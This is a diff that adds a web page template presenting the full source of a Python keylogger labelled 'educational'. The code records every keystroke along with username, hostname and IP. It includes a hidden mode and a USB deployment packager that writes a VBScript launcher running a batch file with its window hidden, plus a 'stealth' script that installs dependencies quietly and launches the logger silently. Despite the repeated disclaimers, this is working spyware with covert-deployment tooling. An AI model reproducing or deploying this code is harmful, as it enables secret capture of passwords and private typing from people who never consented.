@@ -1,0 +1,420 @@
+{% extends "layout.html" %}
+
+{% block content %}
+<h1 class="mb-4">Source Code</h1>
+
+<p class="lead">The complete source code of the educational keylogger is presented below for transparency and educational purposes. Comments are included to explain each function and its purpose.</p>
+
+<div class="alert alert-info">
+    <h4>Educational Purpose</h4>
+    <p>This code is provided to help understand the mechanics of keyboard monitoring. Reviewing this code can help security professionals identify similar patterns in potential malware and develop better detection methods.</p>
+</div>
+
+<div class="code-block">
+<pre class="language-python">
+"""
+Educational Keylogger Demonstration
+-----------------------------------
+This script demonstrates the basic concepts of keyboard monitoring for educational purposes only.
+It captures keyboard inputs and logs them to a text file.
+
+DISCLAIMER:
+    This tool is for EDUCATIONAL PURPOSES ONLY.
+    Using keyloggers without consent is illegal and unethical.
+    Always respect privacy and adhere to applicable laws and regulations.
+    The author assumes no liability for misuse of this code.
+
+Requirements:
+    - Python 3.6+
+    - pynput library (install with: pip install pynput)
+    - Windows operating system
+
+Author: For Educational Use Only
+"""
+
+import os
+import datetime
+import logging
+import platform
+import socket
+import getpass
+import threading
+import time
+
+# Check if pynput is installed, provide helpful message if not
+try:
+    from pynput import keyboard
+except ImportError:
+    print("Error: The 'pynput' library is not installed.")
+    print("Please install it using: pip install pynput")
+    print("\nIf you're preparing this for a USB drive deployment:")
+    print("1. Make sure to include the requirements.txt file")
+    print("2. Include a batch file that runs: pip install -r requirements.txt")
+    exit(1)
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, 
+                    format='%(asctime)s - %(message)s',
+                    datefmt='%Y-%m-%d %H:%M:%S')
+logger = logging.getLogger(__name__)
+
+class EducationalKeylogger:
+    """
+    A basic keylogger implementation for educational demonstration.
+    Shows how keyboard monitoring works without any malicious intent.
+    """
+    
+    def __init__(self, log_dir="logs", collect_system_info=True, run_hidden=False):
+        """
+        Initialize the keylogger.
+        
+        Args:
+            log_dir (str): Directory to store log files
+            collect_system_info (bool): Whether to collect basic system information
+            run_hidden (bool): For educational purposes - demonstrates how malware might hide itself
+        """
+        self.log_dir = log_dir
+        self.log_file = None
+        self.collect_system_info = collect_system_info
+        self.run_hidden = run_hidden
+        self.special_keys = {
+            keyboard.Key.space: " ",
+            keyboard.Key.enter: "[ENTER]\n",
+            keyboard.Key.tab: "[TAB]",
+            keyboard.Key.backspace: "[BACKSPACE]",
+            keyboard.Key.shift: "[SHIFT]",
+            keyboard.Key.shift_r: "[SHIFT]",
+            keyboard.Key.ctrl: "[CTRL]",
+            keyboard.Key.ctrl_r: "[CTRL]",
+            keyboard.Key.alt: "[ALT]",
+            keyboard.Key.alt_r: "[ALT]",
+            keyboard.Key.caps_lock: "[CAPS_LOCK]",
+            keyboard.Key.esc: "[ESC]",
+            keyboard.Key.delete: "[DELETE]",
+            keyboard.Key.up: "[UP]",
+            keyboard.Key.down: "[DOWN]",
+            keyboard.Key.left: "[LEFT]",
+            keyboard.Key.right: "[RIGHT]",
+            keyboard.Key.home: "[HOME]",
+            keyboard.Key.end: "[END]",
+            keyboard.Key.page_up: "[PAGE_UP]",
+            keyboard.Key.page_down: "[PAGE_DOWN]",
+            keyboard.Key.f1: "[F1]",
+            keyboard.Key.f2: "[F2]",
+            keyboard.Key.f3: "[F3]",
+            keyboard.Key.f4: "[F4]",
+            keyboard.Key.f5: "[F5]",
+            keyboard.Key.f6: "[F6]",
+            keyboard.Key.f7: "[F7]",
+            keyboard.Key.f8: "[F8]",
+            keyboard.Key.f9: "[F9]",
+            keyboard.Key.f10: "[F10]",
+            keyboard.Key.f11: "[F11]",
+            keyboard.Key.f12: "[F12]",
+        }
+        
+        # Create log directory if it doesn't exist
+        if not os.path.exists(log_dir):
+            os.makedirs(log_dir)
+            
+        # Create a new log file with timestamp
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        self.log_file = os.path.join(self.log_dir, f"keylog_{timestamp}.txt")
+        
+        # Write header to log file
+        with open(self.log_file, 'a') as f:
+            f.write("=== EDUCATIONAL KEYLOGGER DEMONSTRATION ===\n")
+            f.write(f"Log started at: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            f.write("===========================================\n\n")
+            
+            # Collect and log system information (for educational purposes)
+            if self.collect_system_info:
+                self._collect_system_info(f)
+                
+    def _collect_system_info(self, file_obj):
+        """
+        Collect and log basic system information.
+        
+        Args:
+            file_obj: The open file object to write to
+        """
+        file_obj.write("--- SYSTEM INFORMATION ---\n")
+        
+        try:
+            # Operating System Info
+            file_obj.write(f"OS: {platform.system()} {platform.release()} {platform.version()}\n")
+            file_obj.write(f"Architecture: {platform.machine()}\n")
+            
+            # User Info
+            file_obj.write(f"Username: {getpass.getuser()}\n")
+            file_obj.write(f"Computer Name: {platform.node()}\n")
+            
+            # Network Info
+            file_obj.write(f"Hostname: {socket.gethostname()}\n")
+            try:
+                file_obj.write(f"IP Address: {socket.gethostbyname(socket.gethostname())}\n")
+            except:
+                file_obj.write("IP Address: Unable to retrieve\n")
+                
+            # Python Info
+            file_obj.write(f"Python Version: {platform.python_version()}\n")
+            
+        except Exception as e:
+            file_obj.write(f"Error collecting system info: {str(e)}\n")
+            
+        file_obj.write("\n--- START OF KEYSTROKE LOG ---\n\n")
+    
+    def on_press(self, key):
+        """
+        Callback function triggered when a key is pressed.
+        
+        Args:
+            key: The key that was pressed
+        """
+        try:
+            # Handle special keys
+            if key in self.special_keys:
+                char = self.special_keys[key]
+            # Handle regular alphanumeric keys
+            else:
+                char = key.char
+                
+            # Log the key
+            self._write_to_log(char)
+            
+        except AttributeError:
+            # Some special keys may not be mapped
+            logger.debug(f"Special key {key} pressed but not mapped")
+        except Exception as e:
+            logger.error(f"Error processing key: {e}")
+    
+    def _write_to_log(self, char):
+        """
+        Write the captured key to the log file.
+        
+        Args:
+            char: The character or key representation to log
+        """
+        try:
+            # Check if log file exists
+            if self.log_file is not None:
+                with open(self.log_file, 'a') as f:
+                    f.write(char)
+        except Exception as e:
+            logger.error(f"Error writing to log file: {e}")
+    
+    def start(self):
+        """
+        Start the keylogger.
+        """
+        # Initialize the log file if it hasn't been already
+        if self.log_file is None:
+            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+            self.log_file = os.path.join(self.log_dir, f"keylog_{timestamp}.txt")
+            with open(self.log_file, 'a') as f:
+                f.write("=== EDUCATIONAL KEYLOGGER DEMONSTRATION ===\n")
+                f.write(f"Log started at: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("===========================================\n\n")
+                if self.collect_system_info:
+                    self._collect_system_info(f)
+        
+        # If not running in hidden mode, display educational notice
+        if not self.run_hidden:
+            print("=" * 60)
+            print("EDUCATIONAL KEYLOGGER DEMONSTRATION")
+            print("=" * 60)
+            print("DISCLAIMER: This tool is for EDUCATIONAL PURPOSES ONLY.")
+            print("Using keyloggers without consent is illegal and unethical.")
+            print("Press Ctrl+C to stop the keylogger demonstration.")
+            print(f"Logging keystrokes to: {self.log_file}")
+            print("=" * 60)
+        
+        # Start listening for keyboard events
+        listener = keyboard.Listener(on_press=self.on_press)
+        listener.start()
+        
+        try:
+            # Keep the program running until Ctrl+C is pressed
+            listener.join()
+        except KeyboardInterrupt:
+            if not self.run_hidden:
+                print("\nKeylogger demonstration stopped.")
+            # Write footer to log file
+            if self.log_file:
+                with open(self.log_file, 'a') as f:
+                    f.write("\n\n===========================================\n")
+                    f.write(f"Log ended at: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        finally:
+            # Stop the listener
+            listener.stop()
+            if not self.run_hidden:
+                print(f"Log file saved to: {self.log_file}")
+                
+    def create_usb_launcher(self, output_dir="."):
+        """
+        Create launcher files for USB deployment demonstration.
+        For educational purposes only.
+        
+        Args:
+            output_dir (str): Directory to save launcher files
+        """
+        # Create requirements.txt
+        with open(os.path.join(output_dir, "requirements.txt"), 'w') as f:
+            f.write("pynput>=1.7.6\n")
+        
+        # Create batch launcher (visible)
+        with open(os.path.join(output_dir, "launch_keylogger_demo.bat"), 'w') as f:
+            f.write("@echo off\n")
+            f.write("echo EDUCATIONAL KEYLOGGER DEMONSTRATION\n")
+            f.write("echo DISCLAIMER: For educational purposes only. Misuse is illegal.\n")
+            f.write("echo.\n")
+            f.write("echo Installing required Python packages...\n")
+            f.write("pip install -r requirements.txt\n")
+            f.write("echo.\n")
+            f.write("echo Starting demonstration...\n")
+            f.write("python keylogger.py\n")
+            f.write("pause\n")
+        
+        # Create hidden launcher (for demonstration of stealth techniques)
+        with open(os.path.join(output_dir, "hidden_launcher_demo.vbs"), 'w') as f:
+            f.write('Set WshShell = CreateObject("WScript.Shell")\n')
+            f.write('WshShell.Run chr(34) & "' + os.path.join(output_dir, "stealth_demo.bat") + '" & Chr(34), 0\n')
+            f.write('Set WshShell = Nothing\n')
+        
+        # Create stealth batch file
+        with open(os.path.join(output_dir, "stealth_demo.bat"), 'w') as f:
+            f.write("@echo off\n")
+            f.write("pip install -q -r requirements.txt\n")
+            f.write("python -c \"from keylogger import EducationalKeylogger; keylogger = EducationalKeylogger(run_hidden=True); keylogger.start()\"\n")
+        
+        # Create README file
+        with open(os.path.join(output_dir, "USB_DEMO_README.txt"), 'w') as f:
+            f.write("=== EDUCATIONAL KEYLOGGER DEMONSTRATION ===\n\n")
+            f.write("DISCLAIMER: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY.\n")
+            f.write("Using keyloggers without consent is illegal and unethical.\n\n")
+            f.write("This demonstration package shows how keyloggers can be deployed\n")
+            f.write("via USB drives. Understanding these techniques is important for\n")
+            f.write("cybersecurity education and awareness.\n\n")
+            f.write("Files included:\n")
+            f.write("- keylogger.py - The main Python script\n")
+            f.write("- requirements.txt - Python package dependencies\n")
+            f.write("- launch_keylogger_demo.bat - Visible launcher (educational)\n")
+            f.write("- hidden_launcher_demo.vbs - Hidden launcher (demonstrates stealth techniques)\n")
+            f.write("- stealth_demo.bat - Background execution script\n\n")
+            f.write("Usage Instructions:\n")
+            f.write("1. Ensure Python 3.6+ is installed on the system\n")
+            f.write("2. Run 'launch_keylogger_demo.bat' for the visible demonstration\n")
+            f.write("3. Logs will be saved in the 'logs' directory\n\n")
+            f.write("IMPORTANT: Never use these techniques without explicit permission.\n")
+            f.write("Unauthorized use of keyloggers may violate computer crime laws.\n")
+            
+        print(f"USB deployment demonstration files created in {output_dir}")
+        print("These files demonstrate how keyloggers could be deployed via USB drives.")
+        print("REMINDER: This is for educational purposes only. Always obtain proper consent.")
+
+
+def create_usb_package(output_dir="usb_demo"):
+    """
+    Create a complete USB package for educational demonstration.
+    
+    Args:
+        output_dir (str): Directory to save demonstration files
+    """
+    if not os.path.exists(output_dir):
+        os.makedirs(output_dir)
+    
+    # Create a copy of the keylogger.py file
+    with open(__file__, 'r') as source:
+        with open(os.path.join(output_dir, "keylogger.py"), 'w') as dest:
+            dest.write(source.read())
+    
+    # Create deployment files
+    keylogger = EducationalKeylogger()
+    keylogger.create_usb_launcher(output_dir)
+    
+    # Create a log analyzer tool (simplified representation)
+    with open(os.path.join(output_dir, "log_analyzer.py"), 'w') as f:
+        f.write('''"""
+Log Analyzer for Educational Keylogger Demonstration
+---------------------------------------------------
+This script helps analyze the keylogger logs for educational understanding.
+"""
+
+import os
+import sys
+import datetime
+import collections
+
+def analyze_log(log_file):
+    """Analyze a keylogger log file."""
+    if not os.path.exists(log_file):
+        print(f"Error: Log file '{log_file}' not found.")
+        return False
+        
+    # Read the log file
+    with open(log_file, 'r') as f:
+        content = f.read()
+    
+    # Extract metadata and keystroke data
+    # [Analysis code would be here]
+    
+    # Display results
+    print("=== Log Analysis Results ===")
+    print(f"Log file: {log_file}")
+    # [Results would be displayed here]
+    
+    return True
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("Usage: python log_analyzer.py <path_to_log_file>")
+        sys.exit(1)
+    
+    log_file = sys.argv[1]
+    if not analyze_log(log_file):
+        sys.exit(1)
+''')
+
+
+if __name__ == "__main__":
+    print("=" * 60)
+    print("EDUCATIONAL KEYLOGGER DEMONSTRATION")
+    print("=" * 60)
+    print("DISCLAIMER: This tool is for EDUCATIONAL PURPOSES ONLY.")
+    print("Using keyloggers without consent is illegal and unethical.")
+    print("=" * 60)
+    
+    print("\nOptions:")
+    print("1. Start keylogger demonstration")
+    print("2. Create USB deployment demonstration package")
+    print("3. Exit")
+    
+    choice = input("\nEnter your choice (1-3): ")
+    
+    if choice == "1":
+        print("\nStarting keylogger demonstration...")
+        print("Press Ctrl+C to stop")
+        keylogger = EducationalKeylogger()
+        keylogger.start()
+    elif choice == "2":
+        output_dir = input("\nEnter output directory (default: usb_demo): ") or "usb_demo"
+        create_usb_package(output_dir)
+    else:
+        print("\nExiting...")
+</pre>
+</div>
+
+<div class="alert alert-warning mt-4">
+    <h4>Important Notice</h4>
+    <p>The code above demonstrates keyboard monitoring techniques for educational purposes. Remember that implementing such monitoring without consent may violate privacy laws and regulations. Always ensure you have proper authorization before using any monitoring technologies.</p>
+</div>
+
+<h2 class="mt-5">Educational Value</h2>
+<p>By studying this code, security professionals and students can:</p>
+<ul>
+    <li>Understand how keyloggers intercept and process keyboard events</li>
+    <li>Learn how to identify similar patterns in potential malware</li>
+    <li>Develop more effective detection and prevention strategies</li>
+    <li>Recognize the ethical and legal implications of monitoring technologies</li>
+</ul>
+{% endblock %}
